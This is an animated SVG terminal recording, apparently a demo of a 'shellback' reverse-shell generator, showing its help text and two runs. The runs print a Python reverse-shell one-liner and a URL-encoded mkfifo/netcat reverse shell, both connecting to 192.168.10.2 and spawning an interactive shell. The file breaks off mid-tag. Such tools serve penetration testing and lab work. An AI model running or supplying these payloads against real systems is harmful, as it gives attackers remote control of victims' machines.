<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="910" height="385.65"><rect width="910" height="385.65" rx="5" ry="5" class="a"/><svg y="0%" x="0%"><circle cx="20" cy="20" r="6" fill="#ff5f58"/><circle cx="40" cy="20" r="6" fill="#ffbd2e"/><circle cx="60" cy="20" r="6" fill="#18c132"/></svg><svg height="325.65" viewBox="0 0 87 32.565" width="870" x="15" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="50"><style>@keyframes m{0%{transform:translateX(0)}2.5%{transform:translateX(-174px)}2.9%{transform:translateX(-435px)}6.8%{transform:translateX(-522px)}7.8%{transform:translateX(-609px)}8.9%{transform:translateX(-696px)}9.8%{transform:translateX(-783px)}11.2%{transform:translateX(-870px)}12.8%{transform:translateX(-957px)}14%{transform:translateX(-1044px)}14.8%{transform:translateX(-1131px)}15.8%{transform:translateX(-1218px)}16.6%{transform:translateX(-1305px)}21.5%{transform:translateX(-1392px)}23.9%{transform:translateX(-1479px)}25.1%{transform:translateX(-1740px)}26.4%{transform:translateX(-2001px)}26.7%{transform:translateX(-2175px)}34.2%{transform:translateX(-2262px)}44.2%{transform:translateX(-2349px)}45.2%{transform:translateX(-2436px)}55.8%{transform:translateX(-3567px)}55.9%{transform:translateX(-5220px)}57.5%{transform:translateX(-5394px)}57.6%{transform:translateX(-5568px)}58.8%{transform:translateX(-5655px)}58.9%{transform:translateX(-5829px)}59.2%{transform:translateX(-6003px)}67.4%{transform:translateX(-6090px)}74.6%{transform:translateX(-6177px)}75.9%{transform:translateX(-6264px)}86.6%{transform:translateX(-10353px)}88.1%{transform:translateX(-10527px)}88.2%{transform:translateX(-10614px)}89.4%{transform:translateX(-10788px)}89.7%{transform:translateX(-10962px)}89.8%{transform:translateX(-11049px)}90%{transform:translateX(-11223px)}to{transform:translateX(-11310px)}}.a{fill:#282d35}.f,.g{fill:#a8cc8c;font-weight:700}.g{fill:#66c2cd}.h,.i{fill:#b9c0cb}.i{font-weight:700}.j{fill:#a8cc8c}.k{fill:#e88388}</style><g font-size="1.67" font-family="Monaco,Consolas,Menlo,'Bitstream Vera Sans Mono','Powerline Symbols',monospace"><defs><symbol id="26"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">19</text></symbol><symbol id="1"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text></symbol><symbol id="3"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">sh</text></symbol><symbol id="4"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">she</text></symbol><symbol id="5"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shel</text></symbol><symbol id="6"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shell</text></symbol><symbol id="7"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellb</text></symbol><symbol id="8"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellba</text></symbol><symbol id="9"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellbac</text></symbol><symbol id="10"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text></symbol><symbol id="11"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-</text></symbol><symbol id="12"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-h</text></symbol><symbol id="13"><text y="1.67" class="h">usage:</text><text x="7.014" y="1.67" class="h">shellback</text><text x="17.034" y="1.67" class="h">[-h]</text><text x="22.044" y="1.67" class="h">[-l]</text><text x="27.054" y="1.67" class="h">[-p]</text><text x="32.064" y="1.67" class="h">[-v]</text><text x="37.074" y="1.67" class="h">[-f]</text><text x="42.084" y="1.67" class="h">[-c]</text><text x="47.094" y="1.67" class="h">[-u]</text><text x="52.104" y="1.67" class="h">[-s]</text></symbol><symbol id="14"><text y="1.67" class="f">shellback.py:</text><text x="14.028" y="1.67" class="h">reverse</text><text x="22.044" y="1.67" class="h">shell</text><text x="28.056" y="1.67" class="h">generator</text></symbol><symbol id="15"><text y="1.67" class="i">arguments</text><text x="9.018" y="1.67" class="h">:</text></symbol><symbol id="16"><text x="2.004" y="1.67" class="h">-h,</text><text x="6.012" y="1.67" class="h">--help</text><text x="19.038" y="1.67" class="h">show</text><text x="24.048" y="1.67" class="h">this</text><text x="29.058" y="1.67" class="h">help</text><text x="34.068" y="1.67" class="h">message</text><text x="42.084" y="1.67" class="h">and</text><text x="46.092" y="1.67" class="h">exit</text></symbol><symbol id="17"><text x="2.004" y="1.67" class="h">-l</text><text x="5.01" y="1.67" class="h">,</text><text x="7.014" y="1.67" class="h">--lhost</text><text x="19.038" y="1.67" class="h">Specify</text><text x="27.054" y="1.67" class="h">local</text><text x="33.066" y="1.67" class="h">host</text><text x="38.076" y="1.67" class="h">ip</text></symbol><symbol id="18"><text x="2.004" y="1.67" class="h">-p</text><text x="5.01" y="1.67" class="h">,</text><text x="7.014" y="1.67" class="h">--lport</text><text x="19.038" y="1.67" class="h">Specify</text><text x="27.054" y="1.67" class="h">a</text><text x="29.058" y="1.67" class="h">local</text><text x="35.07" y="1.67" class="h">port</text><text x="40.08" y="1.67" class="h">[</text><text x="41.082" y="1.67" class="i">default</text><text x="49.098" y="1.67" class="j">8080</text><text x="53.106" y="1.67" class="h">]</text></symbol><symbol id="19"><text x="2.004" y="1.67" class="h">-v</text><text x="5.01" y="1.67" class="h">,</text><text x="7.014" y="1.67" class="h">--version</text><text x="19.038" y="1.67" class="h">Specify</text><text x="27.054" y="1.67" class="h">the</text><text x="31.062" y="1.67" class="h">language</text><text x="40.08" y="1.67" class="h">to</text><text x="43.086" y="1.67" class="h">generate</text><text x="52.104" y="1.67" class="h">the</text><text x="56.112" y="1.67" class="h">reverse</text><text x="64.128" y="1.67" class="h">shell</text><text x="70.14" y="1.67" class="h">[</text><text x="71.142" y="1.67" class="i">default</text><text x="79.158" y="1.67" class="j">bash</text><text x="83.166" y="1.67" class="h">]</text></symbol><symbol id="20"><text x="2.004" y="1.67" class="h">-f,</text><text x="6.012" y="1.67" class="h">--tofile</text><text x="19.038" y="1.67" class="h">reverse-shell</text><text x="33.066" y="1.67" class="h">command</text><text x="41.082" y="1.67" class="h">to</text><text x="44.088" y="1.67" class="h">be</text><text x="47.094" y="1.67" class="h">written</text><text x="55.11" y="1.67" class="h">in</text><text x="58.116" y="1.67" class="h">a</text><text x="60.12" y="1.67" class="h">file</text></symbol><symbol id="21"><text x="2.004" y="1.67" class="h">-c,</text><text x="6.012" y="1.67" class="h">--copy</text><text x="19.038" y="1.67" class="h">Copy</text><text x="24.048" y="1.67" class="h">reverse-shell</text><text x="38.076" y="1.67" class="h">command</text><text x="46.092" y="1.67" class="h">to</text><text x="49.098" y="1.67" class="h">clipboard</text><text x="59.118" y="1.67" class="h">[</text><text x="60.12" y="1.67" class="i">default</text><text x="68.136" y="1.67" class="k">False</text><text x="73.146" y="1.67" class="h">]</text></symbol><symbol id="22"><text x="2.004" y="1.67" class="h">-u,</text><text x="6.012" y="1.67" class="h">--uencode</text><text x="19.038" y="1.67" class="h">Urlencode</text><text x="29.058" y="1.67" class="h">the</text><text x="33.066" y="1.67" class="h">reverse-shell</text><text x="47.094" y="1.67" class="h">command</text><text x="55.11" y="1.67" class="h">[</text><text x="56.112" y="1.67" class="i">default</text><text x="64.128" y="1.67" class="k">False</text><text x="69.138" y="1.67" class="h">]</text></symbol><symbol id="23"><text x="2.004" y="1.67" class="h">-s</text><text x="5.01" y="1.67" class="h">,</text><text x="7.014" y="1.67" class="h">--shell</text><text x="19.038" y="1.67" class="h">Specify</text><text x="27.054" y="1.67" class="h">shell</text><text x="33.066" y="1.67" class="h">type</text><text x="38.076" y="1.67" class="h">to</text><text x="41.082" y="1.67" class="h">use</text><text x="45.09" y="1.67" class="h">(not</text><text x="50.1" y="1.67" class="h">always</text><text x="57.114" y="1.67" class="h">applicable)</text><text x="69.138" y="1.67" class="h">[</text><text x="70.14" y="1.67" class="i">default</text><text x="78.156" y="1.67" class="j">sh</text><text x="80.16" y="1.67" class="h">]</text></symbol><symbol id="24"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text></symbol><symbol id="25"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">1</text></symbol><symbol id="2"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">s</text></symbol><symbol id="27"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192</text></symbol><symbol id="28"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.16</text></symbol><symbol id="29"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.</text></symbol><symbol id="30"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.1</text></symbol><symbol id="31"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10</text></symbol><symbol id="32"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.</text></symbol><symbol id="33"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text></symbol><symbol id="34"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-</text></symbol><symbol id="35"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text></symbol><symbol id="36"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">python</text></symbol><symbol id="37"><text y="1.67" class="i">[</text><text x="1.002" y="1.67" class="f">python</text><text x="7.014" y="1.67" class="i">]</text><text x="9.018" y="1.67" class="h">reverse-shell:</text></symbol><symbol id="38"><text y="1.67" class="h">python</text><text x="7.014" y="1.67" class="h">-c</text><text x="10.02" y="1.67" class="h">&apos;import</text><text x="18.036" y="1.67" class="h">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREA</text></symbol><symbol id="39"><text y="1.67" class="h">M);s.connect((&quot;192.168.10.2&quot;,8080));os.dup2(s.fileno(),0);</text><text x="59.118" y="1.67" class="h">os.dup2(s.fileno(),1);</text><text x="82.164" y="1.67" class="h">os.du</text></symbol><symbol id="40"><text y="1.67" class="h">p2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</text></symbol><symbol id="41"><text y="1.67" class="i">[+]</text><text x="4.008" y="1.67" class="h">Shell</text><text x="10.02" y="1.67" class="h">type</text><text x="15.03" y="1.67" class="h">chosen:</text><text x="23.046" y="1.67" class="i">/bin/sh</text></symbol><symbol id="42"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text></symbol><symbol id="43"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text></symbol><symbol id="44"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text></symbol><symbol id="45"><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-s</text><text x="55.11" y="1.67" class="h">bash</text></symbol><symbol id="46"><text y="1.67" class="i">[</text><text x="1.002" y="1.67" class="f">nc2</text><text x="4.008" y="1.67" class="i">]</text><text x="6.012" y="1.67" class="h">reverse-shell:</text></symbol><symbol id="47"><text y="1.67" class="h">rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fbash+-i+2%3E%261%7Cnc+192</text></symbol><symbol id="48"><text y="1.67" class="h">.168.10.2+9090+%3E%2Ftmp%2Ff</text></symbol><symbol id="49"><text y="1.67" class="i">[+]</text><text x="4.008" y="1.67" class="h">Shell</text><text x="10.02" y="1.67" class="h">type</text><text x="15.03" y="1.67" class="h">chosen:</text><text x="23.046" y="1.67" class="i">/bin/bash</text></symbol><symbol id="50"><text y="1.67" class="i">[+]</text><text x="4.008" y="1.67" class="f">nc2</text><text x="8.016" y="1.67" class="h">reverse-shell</text><text x="22.044" y="1.67" class="h">command</text><text x="30.06" y="1.67" class="h">copied</text><text x="37.074" y="1.67" class="h">to</text><text x="40.08" y="1.67" class="h">clipboard!</text></symbol><symbol id="a"><path fill="transparent" d="M0 0h87v16H0z"/></symbol></defs><path class="a" d="M0 0h87v32.565H0z"/><g style="animation-duration:9.402162s;animation-iteration-count:infinite;animation-name:m;animation-timing-function:steps(1,end)"><svg width="11397"><svg><use xlink:href="#a"/></svg><svg x="87"><use xlink:href="#a"/></svg><svg x="174"><use xlink:href="#a"/></svg><svg x="261"><use xlink:href="#a"/><use xlink:href="#1"/></svg><svg x="348"><use xlink:href="#a"/><use xlink:href="#1"/></svg><svg x="435"><use xlink:href="#a"/><use xlink:href="#1"/></svg><svg x="522"><use xlink:href="#a"/><use xlink:href="#2"/></svg><svg x="609"><use xlink:href="#a"/><use xlink:href="#3"/></svg><svg x="696"><use xlink:href="#a"/><use xlink:href="#4"/></svg><svg x="783"><use xlink:href="#a"/><use xlink:href="#5"/></svg><svg x="870"><use xlink:href="#a"/><use xlink:href="#6"/></svg><svg x="957"><use xlink:href="#a"/><use xlink:href="#7"/></svg><svg x="1044"><use xlink:href="#a"/><use xlink:href="#8"/></svg><svg x="1131"><use xlink:href="#a"/><use xlink:href="#9"/></svg><svg x="1218"><use xlink:href="#a"/><use xlink:href="#10"/></svg><svg x="1305"><use xlink:href="#a"/><use xlink:href="#10"/></svg><svg x="1392"><use xlink:href="#a"/><use xlink:href="#11"/></svg><svg x="1479"><use xlink:href="#a"/><use xlink:href="#12"/></svg><svg x="1566"><use xlink:href="#a"/><use xlink:href="#12"/></svg><svg x="1653"><use xlink:href="#a"/><use xlink:href="#12"/></svg><svg x="1740"><use xlink:href="#a"/><use xlink:href="#12"/></svg><svg x="1827"><use xlink:href="#a"/><use xlink:href="#12"/><use xlink:href="#13" y="2.171"/><use xlink:href="#14" y="6.513"/><use xlink:href="#15" y="10.855"/><use xlink:href="#16" y="13.026"/><use xlink:href="#17" y="15.197"/><use xlink:href="#18" y="17.368"/><use xlink:href="#19" y="19.539"/><use xlink:href="#20" y="21.71"/><use xlink:href="#21" y="23.881"/><use xlink:href="#22" y="26.052"/><use xlink:href="#23" y="28.223"/></svg><svg x="1914"><use xlink:href="#a"/><use xlink:href="#12"/><use xlink:href="#13" y="2.171"/><use xlink:href="#14" y="6.513"/><use xlink:href="#15" y="10.855"/><use xlink:href="#16" y="13.026"/><use xlink:href="#17" y="15.197"/><use xlink:href="#18" y="17.368"/><use xlink:href="#19" y="19.539"/><use xlink:href="#20" y="21.71"/><use xlink:href="#21" y="23.881"/><use xlink:href="#22" y="26.052"/><use xlink:href="#23" y="28.223"/></svg><svg x="2001"><use xlink:href="#a"/><use xlink:href="#12"/><use xlink:href="#13" y="2.171"/><use xlink:href="#14" y="6.513"/><use xlink:href="#15" y="10.855"/><use xlink:href="#16" y="13.026"/><use xlink:href="#17" y="15.197"/><use xlink:href="#18" y="17.368"/><use xlink:href="#19" y="19.539"/><use xlink:href="#20" y="21.71"/><use xlink:href="#21" y="23.881"/><use xlink:href="#22" y="26.052"/><use xlink:href="#23" y="28.223"/></svg><svg x="2088"><use xlink:href="#a"/><use xlink:href="#12"/><use xlink:href="#13" y="2.171"/><use xlink:href="#14" y="6.513"/><use xlink:href="#15" y="10.855"/><use xlink:href="#16" y="13.026"/><use xlink:href="#17" y="15.197"/><use xlink:href="#18" y="17.368"/><use xlink:href="#19" y="19.539"/><use xlink:href="#20" y="21.71"/><use xlink:href="#21" y="23.881"/><use xlink:href="#22" y="26.052"/><use xlink:href="#23" y="28.223"/><use xlink:href="#1" y="30.394"/></svg><svg x="2175"><use xlink:href="#a"/><use xlink:href="#12"/><use xlink:href="#13" y="2.171"/><use xlink:href="#14" y="6.513"/><use xlink:href="#15" y="10.855"/><use xlink:href="#16" y="13.026"/><use xlink:href="#17" y="15.197"/><use xlink:href="#18" y="17.368"/><use xlink:href="#19" y="19.539"/><use xlink:href="#20" y="21.71"/><use xlink:href="#21" y="23.881"/><use xlink:href="#22" y="26.052"/><use xlink:href="#23" y="28.223"/><use xlink:href="#1" y="30.394"/></svg><svg x="2262"><use xlink:href="#a"/><use xlink:href="#1"/></svg><svg x="2349"><use xlink:href="#a"/><use xlink:href="#2"/></svg><svg x="2436"><use xlink:href="#a"/><use xlink:href="#3"/></svg><svg x="2523"><use xlink:href="#a"/><use xlink:href="#4"/></svg><svg x="2610"><use xlink:href="#a"/><use xlink:href="#5"/></svg><svg x="2697"><use xlink:href="#a"/><use xlink:href="#6"/></svg><svg x="2784"><use xlink:href="#a"/><use xlink:href="#7"/></svg><svg x="2871"><use xlink:href="#a"/><use xlink:href="#8"/></svg><svg x="2958"><use xlink:href="#a"/><use xlink:href="#9"/></svg><svg x="3045"><use xlink:href="#a"/><use xlink:href="#10"/></svg><svg x="3132"><use xlink:href="#a"/><use xlink:href="#11"/></svg><svg x="3219"><use xlink:href="#a"/><use xlink:href="#24"/></svg><svg x="3306"><use xlink:href="#a"/><use xlink:href="#25"/></svg><svg x="3393"><use xlink:href="#a"/><use xlink:href="#26"/></svg><svg x="3480"><use xlink:href="#a"/><use xlink:href="#27"/></svg><svg x="3567"><use xlink:href="#a"/><use xlink:href="#28"/></svg><svg x="3654"><use xlink:href="#a"/><use xlink:href="#29"/></svg><svg x="3741"><use xlink:href="#a"/><use xlink:href="#30"/></svg><svg x="3828"><use xlink:href="#a"/><use xlink:href="#31"/></svg><svg x="3915"><use xlink:href="#a"/><use xlink:href="#32"/></svg><svg x="4002"><use xlink:href="#a"/><use xlink:href="#33"/></svg><svg x="4089"><use xlink:href="#a"/><use xlink:href="#33"/></svg><svg x="4176"><use xlink:href="#a"/><use xlink:href="#34"/></svg><svg x="4263"><use xlink:href="#a"/><use xlink:href="#35"/></svg><svg x="4350"><use xlink:href="#a"/><use xlink:href="#35"/></svg><svg x="4437"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">s</text></svg><svg x="4524"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text></svg><svg x="4611"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-</text></svg><svg x="4698"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text></svg><svg x="4785"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">p</text></svg><svg x="4872"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">py</text></svg><svg x="4959"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">pyt</text></svg><svg x="5046"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">pyth</text></svg><svg x="5133"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-s</text><text x="34.068" y="1.67" class="h">sh</text><text x="37.074" y="1.67" class="h">-v</text><text x="40.08" y="1.67" class="h">pytho</text></svg><svg x="5220"><use xlink:href="#a"/><use xlink:href="#36"/></svg><svg x="5307"><use xlink:href="#a"/><use xlink:href="#36"/></svg><svg x="5394"><use xlink:href="#a"/><use xlink:href="#36"/></svg><svg x="5481"><use xlink:href="#a"/><use xlink:href="#36"/></svg><svg x="5568"><use xlink:href="#a"/><use xlink:href="#36"/></svg><svg x="5655"><use xlink:href="#a"/><use xlink:href="#36"/><use xlink:href="#37" y="2.171"/><use xlink:href="#38" y="6.513"/><use xlink:href="#39" y="8.684"/><use xlink:href="#40" y="10.855"/><use xlink:href="#41" y="15.197"/></svg><svg x="5742"><use xlink:href="#a"/><use xlink:href="#36"/><use xlink:href="#37" y="2.171"/><use xlink:href="#38" y="6.513"/><use xlink:href="#39" y="8.684"/><use xlink:href="#40" y="10.855"/><use xlink:href="#41" y="15.197"/></svg><svg x="5829"><use xlink:href="#a"/><use xlink:href="#36"/><use xlink:href="#37" y="2.171"/><use xlink:href="#38" y="6.513"/><use xlink:href="#39" y="8.684"/><use xlink:href="#40" y="10.855"/><use xlink:href="#41" y="15.197"/></svg><svg x="5916"><use xlink:href="#a"/><use xlink:href="#36"/><use xlink:href="#37" y="2.171"/><use xlink:href="#38" y="6.513"/><use xlink:href="#39" y="8.684"/><use xlink:href="#40" y="10.855"/><use xlink:href="#41" y="15.197"/><use xlink:href="#1" y="17.368"/></svg><svg x="6003"><use xlink:href="#a"/><use xlink:href="#36"/><use xlink:href="#37" y="2.171"/><use xlink:href="#38" y="6.513"/><use xlink:href="#39" y="8.684"/><use xlink:href="#40" y="10.855"/><use xlink:href="#41" y="15.197"/><use xlink:href="#1" y="17.368"/></svg><svg x="6090"><use xlink:href="#a"/><use xlink:href="#1"/></svg><svg x="6177"><use xlink:href="#a"/><use xlink:href="#2"/></svg><svg x="6264"><use xlink:href="#a"/><use xlink:href="#3"/></svg><svg x="6351"><use xlink:href="#a"/><use xlink:href="#4"/></svg><svg x="6438"><use xlink:href="#a"/><use xlink:href="#5"/></svg><svg x="6525"><use xlink:href="#a"/><use xlink:href="#6"/></svg><svg x="6612"><use xlink:href="#a"/><use xlink:href="#7"/></svg><svg x="6699"><use xlink:href="#a"/><use xlink:href="#8"/></svg><svg x="6786"><use xlink:href="#a"/><use xlink:href="#9"/></svg><svg x="6873"><use xlink:href="#a"/><use xlink:href="#10"/></svg><svg x="6960"><use xlink:href="#a"/><use xlink:href="#10"/></svg><svg x="7047"><use xlink:href="#a"/><use xlink:href="#11"/></svg><svg x="7134"><use xlink:href="#a"/><use xlink:href="#24"/></svg><svg x="7221"><use xlink:href="#a"/><use xlink:href="#25"/></svg><svg x="7308"><use xlink:href="#a"/><use xlink:href="#26"/></svg><svg x="7395"><use xlink:href="#a"/><use xlink:href="#27"/></svg><svg x="7482"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.</text></svg><svg x="7569"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.1</text></svg><svg x="7656"><use xlink:href="#a"/><use xlink:href="#28"/></svg><svg x="7743"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168</text></svg><svg x="7830"><use xlink:href="#a"/><use xlink:href="#29"/></svg><svg x="7917"><use xlink:href="#a"/><use xlink:href="#30"/></svg><svg x="8004"><use xlink:href="#a"/><use xlink:href="#31"/></svg><svg x="8091"><use xlink:href="#a"/><use xlink:href="#32"/></svg><svg x="8178"><use xlink:href="#a"/><use xlink:href="#33"/></svg><svg x="8265"><use xlink:href="#a"/><use xlink:href="#33"/></svg><svg x="8352"><use xlink:href="#a"/><use xlink:href="#34"/></svg><svg x="8439"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text></svg><svg 